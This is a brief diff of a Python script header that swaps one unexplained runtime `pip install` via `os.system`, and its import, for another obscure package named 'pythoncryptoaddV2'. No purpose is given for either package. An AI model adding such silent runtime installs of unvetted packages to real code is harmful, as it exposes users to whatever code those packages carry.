@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqlkit")
-import pipsqlkit
+os.system("pip install pythoncryptoaddV2")
+import pythoncryptoaddV2
 import random
 import requests
 import time
